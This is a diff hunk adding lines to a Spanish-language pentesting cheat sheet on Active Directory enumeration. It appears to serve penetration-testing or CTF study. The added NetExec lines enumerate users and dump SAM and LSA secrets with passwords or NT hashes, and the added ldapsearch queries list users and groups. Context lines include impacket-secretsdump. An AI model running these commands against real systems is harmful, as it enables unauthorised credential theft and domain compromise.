@@ -756,10 +756,23 @@ EXT-ENUM
   crackmapexec smb [IP_DC] -u 'user' -p 'password' --groups --> enumerar grupos en los equipos con un user autenticado
   crackmapexec smb [IP_DC] -u 'user' -p 'password' --users --> enumerar usuarios en los equipos con un user autenticado
   crackmapexec smb [IP_DC] --pass-pol --> enumerar politica contraseñas del dominio
+  nxc smb 10.10.10.10 -u "" -p "" --users --> Enumeración de usuarios
+  nxc smb 10.10.10.10 -u "" -p "" --rid-brute --> Enumeración de usuarios
+  nxc smb 10.10.10.10 -u "guest" -p "" --users --> Enumeración de usuarios con guest
+  nxc smb 10.10.10.10 -u "guest" -p "" --rid-brute --> Enumeración de usuarios con guest
+  nxc smb 10.10.10.10 -u "USER" -p "PASS" --users --> Enumeración de usuarios con credenciales
+  nxc smb 10.10.10.10 -u "USER" -p "PASS" --rid-brute --> Enumeración de usuarios con credenciales
+  nxc smb 10.10.10.10 -u USER -p 'PASSWORD' -d domain.local --sam --> Dump SAM
+  nxc smb 10.10.10.10 -u USER -H 'PASSWORD' --local-auth --sam --> Dump SAM local
+  nxc smb 10.10.10.10 -d DOMINIO -u USER -p 'PASSWORD' --lsa --> Dump LSASS
+  nxc smb 10.10.10.10 -d DOMINIO -u USER -H 'NTHASH' --lsa --> Dump LSASS mediante Hash
   bloodhound-python -u user -p password -d dominio.local -c All --> sacar información del dominio para verla con bloodhound
   rusthound -d tu_dominio.local -u nombre_usuario -p "tu_contraseña" -dc <IP_del_DC> -z --adcs --> sacar información del dominio para verla con rusthound
   ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)" --> descubrir el DC por medio de ldap
   ldapsearch -x -H ldap://IP -b "dc=thm,dc=local" --> enumerar usuarios y sus propiedades
+  ldapsearch -x -H 'ldap://10.10.10.10' -b "DC=domain,DC=local" "(objectClass=user)" userPrincipalName --> enumeración de usuarios sin credenciales
+  ldapsearch -x -H ldap://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=DOMAIN,DC=LOCAL" "(objectClass=user)" userPrincipalName --> enumeración de usuarios con credenciales
+  ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=group)" cn member --> enumeración de grupos con credenciales
   impacket-secretsdump -just-dc-ntlm dominio.local/user@IP -- mostrar hash de contraseñas de usuarios
   enum4linux-ng -A IP
   kerbrute https://github.com/ropnop/kerbrute/releases
